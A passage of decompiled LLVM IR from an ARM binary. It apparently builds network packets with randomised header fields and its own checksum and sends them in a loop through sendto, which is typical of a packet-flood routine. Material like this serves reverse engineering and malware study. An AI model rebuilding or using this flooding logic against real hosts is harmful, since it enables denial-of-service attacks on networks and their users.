  %v9_dc34 = icmp eq i32 %v3_d958, %v1_dc34
  store i1 %v9_dc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc34, label %dec_label_pc_dd44, label %dec_label_pc_dc3c

dec_label_pc_dc3c:                                ; preds = %dec_label_pc_dd28.dec_label_pc_dc3c_crit_edge, %dec_label_pc_dc30
  %v1_dc40 = phi i32 [ %v1_dc40.pre, %dec_label_pc_dd28.dec_label_pc_dc3c_crit_edge ], [ %v1_dc34, %dec_label_pc_dc30 ]
  store i32 %v3_d95c, i32* %lr.global-to-local, align 4
  %v9_dc40 = icmp eq i32 %v3_d95c, %v1_dc40
  store i1 %v9_dc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc40, label %dec_label_pc_dd60, label %dec_label_pc_dc48

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dd44.dec_label_pc_dc48_crit_edge, %dec_label_pc_dc3c
  %v1_dc4c = phi i32 [ %v1_dc4c.pre, %dec_label_pc_dd44.dec_label_pc_dc48_crit_edge ], [ %v1_dc40, %dec_label_pc_dc3c ]
  store i32 %v3_d960, i32* %r0.global-to-local, align 4
  %v9_dc4c = icmp eq i32 %v3_d960, %v1_dc4c
  store i1 %v9_dc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc4c, label %dec_label_pc_dd7c, label %dec_label_pc_dc54

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dd60, %dec_label_pc_dc48, %dec_label_pc_dd7c
  %v0_dc54 = load i32, i32* @r4, align 4
  %v1_dc54 = add i32 %v0_dc54, 41
  store i32 %v1_dc54, i32* %r0.global-to-local, align 4
  store i32 %v4_dc58.pre-phi, i32* %r1.global-to-local, align 4
  %v2_dc5c = call i32 @function_f778(i32 %v1_dc54, i32 %v4_dc58.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dc64 = load i32, i32* @r7, align 4
  %v1_dc64 = trunc i32 %v0_dc64 to i8
  %v2_dc64 = load i32, i32* @r4, align 4
  %v3_dc64 = add i32 %v2_dc64, 10
  %v4_dc64 = inttoptr i32 %v3_dc64 to i8*
  store i8 %v1_dc64, i8* %v4_dc64, align 1
  %v0_dc68 = load i32, i32* @r7, align 4
  %v1_dc68 = trunc i32 %v0_dc68 to i8
  %v2_dc68 = load i32, i32* @r4, align 4
  %v3_dc68 = add i32 %v2_dc68, 11
  %v4_dc68 = inttoptr i32 %v3_dc68 to i8*
  store i8 %v1_dc68, i8* %v4_dc68, align 1
  %v0_dc6c = load i32, i32* @r4, align 4
  store i32 %v0_dc6c, i32* @r0, align 4
  %v2_dc70 = call i32 @function_de24(i32 %v0_dc6c, i32 20)
  %v3_dc70 = trunc i32 %v2_dc70 to i8
  store i32 %v2_dc70, i32* %r0.global-to-local, align 4
  %v4_dc74 = sdiv i32 %v2_dc70, 256
  store i32 %v4_dc74, i32* %r3.global-to-local, align 4
  %v1_dc78 = trunc i32 %v4_dc74 to i8
  %v2_dc78 = load i32, i32* @r4, align 4
  %v3_dc78 = add i32 %v2_dc78, 11
  %v4_dc78 = inttoptr i32 %v3_dc78 to i8*
  store i8 %v1_dc78, i8* %v4_dc78, align 1
  %v3_dc7c = load i32, i32* @r4, align 4
  %v4_dc7c = add i32 %v3_dc7c, 10
  %v5_dc7c = inttoptr i32 %v4_dc7c to i8*
  store i8 %v3_dc70, i8* %v5_dc7c, align 1
  %v0_dc80 = load i32, i32* @r7, align 4
  %v1_dc80 = trunc i32 %v0_dc80 to i8
  %v2_dc80 = load i32, i32* @r5, align 4
  %v3_dc80 = add i32 %v2_dc80, 6
  %v4_dc80 = inttoptr i32 %v3_dc80 to i8*
  store i8 %v1_dc80, i8* %v4_dc80, align 1
  %v0_dc84 = load i32, i32* @r7, align 4
  %v1_dc84 = trunc i32 %v0_dc84 to i8
  %v2_dc84 = load i32, i32* @r5, align 4
  %v3_dc84 = add i32 %v2_dc84, 7
  %v4_dc84 = inttoptr i32 %v3_dc84 to i8*
  store i8 %v1_dc84, i8* %v4_dc84, align 1
  %v0_dc88 = load i32, i32* @r4, align 4
  %v1_dc88 = add i32 %v0_dc88, 24
  %v2_dc88 = inttoptr i32 %v1_dc88 to i8*
  %v3_dc88 = load i8, i8* %v2_dc88, align 1
  %v4_dc88 = zext i8 %v3_dc88 to i32
  store i32 %v4_dc88, i32* %r3.global-to-local, align 4
  %v1_dc8c = add i32 %v0_dc88, 25
  %v2_dc8c = inttoptr i32 %v1_dc8c to i8*
  %v3_dc8c = load i8, i8* %v2_dc8c, align 1
  %v4_dc8c = zext i8 %v3_dc8c to i32
  %v0_dc90 = load i32, i32* @r5, align 4
  store i32 %v0_dc90, i32* @r1, align 4
  %v4_dc94 = mul nuw nsw i32 %v4_dc8c, 256
  %v5_dc94 = or i32 %v4_dc94, %v4_dc88
  store i32 %v5_dc94, i32* %r2.global-to-local, align 4
  store i32 %v0_dc88, i32* %r0.global-to-local, align 4
  %v0_dc9c = load i32, i32* @sb, align 4
  store i32 %v0_dc9c, i32* %r3.global-to-local, align 4
  %v4_dca0 = call i32 @function_de80(i32 %v0_dc88, i32 %v0_dc90, i32 %v5_dc94, i32 %v0_dc9c)
  %v5_dca0 = trunc i32 %v4_dca0 to i8
  store i32 %v4_dca0, i32* %r0.global-to-local, align 4
  %v3_dca4 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_dcb4 = mul i32 %v3_dca4, 24
  %v2_dcb8 = add i32 %v5_dcb4, %arg2
  store i32 %v2_dcb8, i32* %lr.global-to-local, align 4
  %v4_dcbc = sdiv i32 %v4_dca0, 256
  store i32 %v4_dcbc, i32* %r3.global-to-local, align 4
  %v3_dcc0 = load i32, i32* @r5, align 4
  %v4_dcc0 = add i32 %v3_dcc0, 6
  %v5_dcc0 = inttoptr i32 %v4_dcc0 to i8*
  store i8 %v5_dca0, i8* %v5_dcc0, align 1
  %v0_dcc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dcc4 = trunc i32 %v0_dcc4 to i8
  %v2_dcc4 = load i32, i32* @r5, align 4
  %v3_dcc4 = add i32 %v2_dcc4, 7
  %v4_dcc4 = inttoptr i32 %v3_dcc4 to i8*
  store i8 %v1_dcc4, i8* %v4_dcc4, align 1
  %v0_dcc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dcc8 = load i32, i32* %lr.global-to-local, align 4
  %v2_dcc8 = add i32 %v1_dcc8, 4
  %v3_dcc8 = inttoptr i32 %v2_dcc8 to i32*
  store i32 %v0_dcc8, i32* %v3_dcc8, align 4
  %v0_dccc = load i32, i32* @r4, align 4
  %v1_dccc = add i32 %v0_dccc, 20
  %v2_dccc = inttoptr i32 %v1_dccc to i32*
  %v3_dccc = load i32, i32* %v2_dccc, align 4
  %v3_dcd0 = udiv i32 %v3_dccc, 65536
  store i32 %v3_dcd0, i32* %r3.global-to-local, align 4
  %v3_dcd413 = udiv i32 %v3_dccc, 16777216
  %v1_dcd8 = trunc i32 %v3_dcd413 to i8
  %v2_dcd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_dcd8 = add i32 %v2_dcd8, 3
  %v4_dcd8 = inttoptr i32 %v3_dcd8 to i8*
  store i8 %v1_dcd8, i8* %v4_dcd8, align 1
  %v0_dcdc = load i32, i32* %r3.global-to-local, align 4
  %v1_dcdc = trunc i32 %v0_dcdc to i8
  %v2_dcdc = load i32, i32* %lr.global-to-local, align 4
  %v3_dcdc = add i32 %v2_dcdc, 2
  %v4_dcdc = inttoptr i32 %v3_dcdc to i8*
  store i8 %v1_dcdc, i8* %v4_dcdc, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_dce8 = load i32, i32* @r4, align 4
  store i32 %v0_dce8, i32* %r1.global-to-local, align 4
  store i32 %v3_d8f4, i32* %r0.global-to-local, align 4
  %v0_dcf0 = load i32, i32* @sl, align 4
  store i32 %v0_dcf0, i32* %r2.global-to-local, align 4
  %v0_dcf4 = load i32, i32* %lr.global-to-local, align 4
  %v4_dcf4 = inttoptr i32 %v0_dcf4 to %sockaddr*
  %v7_dcfc = inttoptr i32 %v0_dce8 to i32*
  %v9_dcfc = call i32 @sendto(i32 %v3_d8f4, i32* %v7_dcfc, i32 %v0_dcf0, i32 16384, %sockaddr* %v4_dcf4, i32 16)
  %v3_dd00 = load i32, i32* %stack_var_-40, align 4
  %v1_dd04 = add i32 %v3_dd00, 1
  store i32 %v1_dd04, i32* %r0.global-to-local, align 4
  store i32 %v1_d680, i32* %r3.global-to-local, align 4
  %v9_dd0c = icmp eq i32 %v1_d680, %v1_dd04
  store i1 %v9_dd0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dd04, i32* %stack_var_-40, align 4
  %v8_dd14 = icmp sgt i32 %v1_d680, %v1_dd04
  br i1 %v8_dd14, label %dec_label_pc_dc54.dec_label_pc_dc14_crit_edge, label %dec_label_pc_dd18

dec_label_pc_dc54.dec_label_pc_dc14_crit_edge:    ; preds = %dec_label_pc_dc54
  %v1_dc20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dc14

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dc54
  store i32 %v1_d680, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dbf4

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dc14
  %v0_dd28 = call i32 @function_f6c4()
  %v1_dd28 = trunc i32 %v0_dd28 to i8
  store i32 %v0_dd28, i32* %r0.global-to-local, align 4
  store i32 %v3_d958, i32* %ip.global-to-local, align 4
  %v4_dd30 = sdiv i32 %v0_dd28, 256
  store i32 %v4_dd30, i32* %r3.global-to-local, align 4
  %v1_dd34 = load i32, i32* @r6, align 4
  %v9_dd34 = icmp eq i32 %v3_d958, %v1_dd34
  store i1 %v9_dd34, i1* %cpsr_z.global-to-local, align 1
  %v1_dd38 = trunc i32 %v4_dd30 to i8
  %v2_dd38 = load i32, i32* @r4, align 4
  %v3_dd38 = add i32 %v2_dd38, 5
  %v4_dd38 = inttoptr i32 %v3_dd38 to i8*
  store i8 %v1_dd38, i8* %v4_dd38, align 1
  %v3_dd3c = load i32, i32* @r4, align 4
  %v4_dd3c = add i32 %v3_dd3c, 4
  %v5_dd3c = inttoptr i32 %v4_dd3c to i8*
  store i8 %v1_dd28, i8* %v5_dd3c, align 1
  %v0_dd40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd40, label %dec_label_pc_dd44, label %dec_label_pc_dd28.dec_label_pc_dc3c_crit_edge

dec_label_pc_dd28.dec_label_pc_dc3c_crit_edge:    ; preds = %dec_label_pc_dd28
  %v1_dc40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dc3c

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dd28, %dec_label_pc_dc30
  %v0_dd44 = call i32 @function_f6c4()
  %v1_dd44 = trunc i32 %v0_dd44 to i8
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  store i32 %v3_d95c, i32* %lr.global-to-local, align 4
  %v4_dd4c = sdiv i32 %v0_dd44, 256
  store i32 %v4_dd4c, i32* %r3.global-to-local, align 4
  %v1_dd50 = load i32, i32* @r6, align 4
  %v9_dd50 = icmp eq i32 %v3_d95c, %v1_dd50
  store i1 %v9_dd50, i1* %cpsr_z.global-to-local, align 1
  %v3_dd54 = load i32, i32* @r4, align 4
  %v4_dd54 = add i32 %v3_dd54, 20
  %v5_dd54 = inttoptr i32 %v4_dd54 to i8*
  store i8 %v1_dd44, i8* %v5_dd54, align 1
  %v0_dd58 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd58 = trunc i32 %v0_dd58 to i8
  %v2_dd58 = load i32, i32* @r5, align 4
  %v3_dd58 = add i32 %v2_dd58, 1
  %v4_dd58 = inttoptr i32 %v3_dd58 to i8*
  store i8 %v1_dd58, i8* %v4_dd58, align 1
  %v0_dd5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd5c, label %dec_label_pc_dd60, label %dec_label_pc_dd44.dec_label_pc_dc48_crit_edge

dec_label_pc_dd44.dec_label_pc_dc48_crit_edge:    ; preds = %dec_label_pc_dd44
  %v1_dc4c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dc48

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dd44, %dec_label_pc_dc3c
  %v0_dd60 = call i32 @function_f6c4()
  %v1_dd60 = trunc i32 %v0_dd60 to i8
  %v4_dd64 = sdiv i32 %v0_dd60, 256
  store i32 %v4_dd64, i32* %r3.global-to-local, align 4
  %v3_dd68 = load i32, i32* @r5, align 4
  %v4_dd68 = add i32 %v3_dd68, 2
  %v5_dd68 = inttoptr i32 %v4_dd68 to i8*
  store i8 %v1_dd60, i8* %v5_dd68, align 1
  store i32 %v3_d960, i32* %r0.global-to-local, align 4
  %v1_dd70 = load i32, i32* @r6, align 4
  %v9_dd70 = icmp eq i32 %v3_d960, %v1_dd70
  store i1 %v9_dd70, i1* %cpsr_z.global-to-local, align 1
  %v0_dd74 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd74 = trunc i32 %v0_dd74 to i8
  %v2_dd74 = load i32, i32* @r5, align 4
  %v3_dd74 = add i32 %v2_dd74, 3
  %v4_dd74 = inttoptr i32 %v3_dd74 to i8*
  store i8 %v1_dd74, i8* %v4_dd74, align 1
  %v0_dd78 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd78, label %dec_label_pc_dd7c, label %dec_label_pc_dc54

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dd60, %dec_label_pc_dc48
  %v0_dd7c = call i32 @function_f6c4()
  %v1_dd7c = trunc i32 %v0_dd7c to i8
  store i32 %v0_dd7c, i32* %r0.global-to-local, align 4
  %v4_dd80 = sdiv i32 %v0_dd7c, 256
  store i32 %v4_dd80, i32* %r3.global-to-local, align 4
  %v3_dd84 = load i32, i32* @r4, align 4
  %v4_dd84 = add i32 %v3_dd84, 28
  %v5_dd84 = inttoptr i32 %v4_dd84 to i8*
  store i8 %v1_dd7c, i8* %v5_dd84, align 1
  %v0_dd88 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd88 = trunc i32 %v0_dd88 to i8
  %v2_dd88 = load i32, i32* @r8, align 4
  %v3_dd88 = add i32 %v2_dd88, 1
  %v4_dd88 = inttoptr i32 %v3_dd88 to i8*
  store i8 %v1_dd88, i8* %v4_dd88, align 1
  br label %dec_label_pc_dc54

dec_label_pc_dd90:                                ; preds = %dec_label_pc_d85c, %dec_label_pc_d828, %dec_label_pc_d7cc, %dec_label_pc_d674
  %v0_dd90 = call i32 @function_f6c4()
  %v1_dd94 = urem i32 %v0_dd90, 4
  store i32 %v1_dd94, i32* %r0.global-to-local, align 4
  %v2_dd98 = icmp eq i32 %v1_dd94, 3
  store i1 %v2_dd98, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_dd90 to i2
  switch i2 %trunc, label %dec_label_pc_d8d020 [
    i2 0, label %dec_label_pc_ddd8
    i2 1, label %dec_label_pc_ddec
    i2 -2, label %dec_label_pc_ddf8
    i2 -1, label %dec_label_pc_de08
  ]

dec_label_pc_ddb4:                                ; preds = %dec_label_pc_d930
  store i32 %v2_d8e0, i32* %r0.global-to-local, align 4
  %v4_ddb8 = sext i8 %v5_d94c to i32
  store i32 %v4_ddb8, i32* %r1.global-to-local, align 4
  %v2_ddbc = add i32 %v4_ddb8, %v2_d8e0
  store i32 %v2_ddbc, i32* @fp, align 4
  br label %dec_label_pc_dbe8

dec_label_pc_ddc4:                                ; preds = %dec_label_pc_d904
  store i32 %v3_d8f4, i32* %r0.global-to-local, align 4
  %v1_ddc8 = call i32 @close(i32 %v3_d8f4)
  store i32 %v1_ddc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_d8dc, %dec_label_pc_d8d0, %dec_label_pc_ddc4
  %v29_ddd4 = phi i32 [ -1, %dec_label_pc_d8dc ], [ %v29_ddd475, %dec_label_pc_d8d0 ], [ %v1_ddc8, %dec_label_pc_ddc4 ]
  store i32 %v3_d674, i32* %r4.global-to-local, align 4
  store i32 %v6_d674, i32* %r5.global-to-local, align 4
  store i32 %v9_d674, i32* %r6.global-to-local, align 4
  store i32 %v12_d674, i32* %r7.global-to-local, align 4
  store i32 %v15_d674, i32* %r8.global-to-local, align 4
  store i32 %v18_d674, i32* %sb.global-to-local, align 4
  store i32 %v21_d674, i32* %sl.global-to-local, align 4
  store i32 %v24_d674, i32* %fp.global-to-local, align 4
  ret i32 %v29_ddd4

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_dd90
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d8d0

dec_label_pc_ddec:                                ; preds = %dec_label_pc_dd90
  store i32 707416650, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d8d0

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_dd90
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d8d0

dec_label_pc_de08:                                ; preds = %dec_label_pc_dd90
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d8d0

; uselistorder directives
  uselistorder i32 %v4_ddb8, { 0, 2, 1 }
  uselistorder i32 %v1_dd94, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_dd90, { 1, 0 }
  uselistorder i32 %v0_dd7c, { 0, 2, 1 }
  uselistorder i32 %v0_dd44, { 0, 2, 1 }
  uselistorder i32 %v4_dd30, { 1, 0 }
  uselistorder i32 %v0_dd28, { 0, 2, 1 }
  uselistorder i32 %v1_dd04, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_dca0, { 0, 2, 1 }
  uselistorder i32 %v0_dc88, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dc74, { 1, 0 }
  uselistorder i32 %v2_dc70, { 0, 2, 1 }
  uselistorder i32 %v7_dc1c, { 1, 0, 2 }
  uselistorder i32 %v4_dc58.pre-phi, { 1, 0 }
  uselistorder i32 %v2_db9c, { 1, 0 }
  uselistorder i32 %v1_db9087, { 1, 0, 2 }
  uselistorder i32 %v1_db84, { 2, 1, 0 }
  uselistorder i32 %v0_db84, { 1, 2, 0 }
  uselistorder i32 %v0_db8432, { 1, 0 }
  uselistorder i32 %v1_db8433, { 2, 0, 1 }
  uselistorder i8 %extract.t79, { 1, 0 }
  uselistorder i32 %v1_db58, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_dad4, { 1, 0 }
  uselistorder i32 %v3_da10, { 1, 0, 2 }
  uselistorder i32 %v1_d9d8, { 1, 0 }
  uselistorder i32 %v1_d9cc, { 1, 0 }
  uselistorder i32 %v1_d9b0, { 1, 0 }
  uselistorder i32 %v1_d99c, { 1, 0 }
  uselistorder i32 %v3_d994, { 1, 0 }
  uselistorder i32 %v4_d98c, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_d94c, { 1, 0 }
  uselistorder i32 %v0_d948, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d944, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d93c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_d8f4, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_d8e0, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v3_d8c8, { 1, 0, 2 }
  uselistorder i1 %v7_d898, { 1, 0 }
  uselistorder i32 %v1_d894, { 1, 0, 2 }
  uselistorder i1 %v8_d88c, { 1, 0 }
  uselistorder i1 %v7_d888, { 1, 0 }
  uselistorder i32 %v1_d87c, { 1, 0 }
  uselistorder i8 %v2_d870, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d874, { 1, 0 }
  uselistorder i32 %v0_d894, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d860, { 0, 2, 1 }
  uselistorder i32 %v1_d878, { 0, 2, 1 }
  uselistorder i32 %v2_d848, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_d840, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d828, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v0_d820, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i32 %v0_d7c4, { 1, 0, 3, 2 }
  uselistorder i32 %v5_d794, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_d718, { 1, 2, 0 }
  uselistorder i32 %v7_d6d4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v6_d6b0, { 2, 1, 3, 0 }
  uselistorder i32 %v4_d698, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_d680, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 50, 8, 49, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 47, 46, 51, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 68, 18, 19, 1, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 52, 51, 53, 55, 54, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i8 46, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @function_930c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder label %dec_label_pc_ddcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dbe8, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_d8a4, { 1, 0 }
  uselistorder label %dec_label_pc_d898, { 1, 0 }
  uselistorder label %dec_label_pc_d85c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d854, { 1, 0 }
}

define i32 @function_de24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_de24:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_de54, label %dec_label_pc_de30

dec_label_pc_de30:                                ; preds = %dec_label_pc_de24
  %v0_de34.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de34

dec_label_pc_de34:                                ; preds = %dec_label_pc_de34, %dec_label_pc_de30
  %v0_de48 = phi i32 [ %v2_de48, %dec_label_pc_de34 ], [ 0, %dec_label_pc_de30 ]
  %v0_de3c = phi i32 [ %v1_de3c, %dec_label_pc_de34 ], [ %arg1, %dec_label_pc_de30 ]
  %v0_de4c = phi i32 [ %v1_de4c, %dec_label_pc_de34 ], [ %v0_de34.pre, %dec_label_pc_de30 ]
  %v1_de34 = inttoptr i32 %v0_de4c to i8*
  %v2_de34 = load i8, i8* %v1_de34, align 1
  %v3_de34 = zext i8 %v2_de34 to i32
  %v1_de38 = add i32 %v0_de4c, 1
  %v2_de38 = inttoptr i32 %v1_de38 to i8*
  %v3_de38 = load i8, i8* %v2_de38, align 1
  %v4_de38 = zext i8 %v3_de38 to i32
  %v1_de3c = add i32 %v0_de3c, -2
  %v4_de40 = mul nuw nsw i32 %v4_de38, 256
  %v5_de40 = or i32 %v4_de40, %v3_de34
  %v2_de48 = add i32 %v5_de40, %v0_de48
  %v1_de4c = add i32 %v0_de4c, 2
  store i32 %v1_de4c, i32* @r0, align 4
  %v1_de3c.cmp = icmp ugt i32 %v1_de3c, 1
  br i1 %v1_de3c.cmp, label %dec_label_pc_de34, label %dec_label_pc_de54

dec_label_pc_de54:                                ; preds = %dec_label_pc_de34, %dec_label_pc_de24
  %v1_de5c = phi i32 [ 0, %dec_label_pc_de24 ], [ %v2_de48, %dec_label_pc_de34 ]
  %v0_de54 = phi i32 [ %arg1, %dec_label_pc_de24 ], [ %v1_de3c, %dec_label_pc_de34 ]
  %v7_de54 = icmp eq i32 %v0_de54, 1
  br i1 %v7_de54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_de54
  %v1_de58 = load i32, i32* @r0, align 4
  %v2_de58 = inttoptr i32 %v1_de58 to i8*
  %v3_de58 = load i8, i8* %v2_de58, align 1
  %v4_de58 = zext i8 %v3_de58 to i32
  %v3_de5c = add i32 %v1_de5c, %v4_de58
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_de54, %bb
  %v0_de60 = phi i32 [ %v1_de5c, %dec_label_pc_de54 ], [ %v3_de5c, %bb ]
  %v3_de64 = urem i32 %v0_de60, 65536
  %v4_de68 = udiv i32 %v0_de60, 65536
  %v5_de68 = add nuw nsw i32 %v4_de68, %v3_de64
  %v4_de6c = udiv i32 %v5_de68, 65536
  %v5_de6c = add nuw nsw i32 %v4_de6c, %v5_de68
  %v1_de70 = urem i32 %v5_de6c, 65536
  %v3_de78 = xor i32 %v1_de70, 65535
  ret i32 %v3_de78

; uselistorder directives
  uselistorder i32 %v5_de68, { 1, 0 }
  uselistorder i32 %v1_de4c, { 1, 0 }
  uselistorder i32 %v1_de3c, { 1, 0, 2 }
  uselistorder i32 %v0_de4c, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_de80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de80:
  %v3_de90 = urem i32 %arg2, 65536
  %v1_de94 = add i32 %arg1, 12
  %v1_de98 = inttoptr i32 %v1_de94 to i32*
  %v2_de98 = load i32, i32* %v1_de98, align 4
  %v3_de98 = add i32 %arg1, 16
  %v4_de98 = inttoptr i32 %v3_de98 to i32*
  %v5_de98 = load i32, i32* %v4_de98, align 4
  %v7_de9c = icmp sgt i32 %arg3, 1
  br i1 %v7_de9c, label %dec_label_pc_dea8.preheader, label %dec_label_pc_dec8

dec_label_pc_dea8.preheader:                      ; preds = %dec_label_pc_de80
  %v0_dea8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_dea8

dec_label_pc_dea8:                                ; preds = %dec_label_pc_dea8.preheader, %dec_label_pc_dea8
  %v0_debc = phi i32 [ 0, %dec_label_pc_dea8.preheader ], [ %v2_debc, %dec_label_pc_dea8 ]
  %v0_deb0 = phi i32 [ %arg3, %dec_label_pc_dea8.preheader ], [ %v1_deb0, %dec_label_pc_dea8 ]
  %v0_dec0 = phi i32 [ %v0_dea8.pre, %dec_label_pc_dea8.preheader ], [ %v1_dec0, %dec_label_pc_dea8 ]
  %v1_dea8 = inttoptr i32 %v0_dec0 to i8*
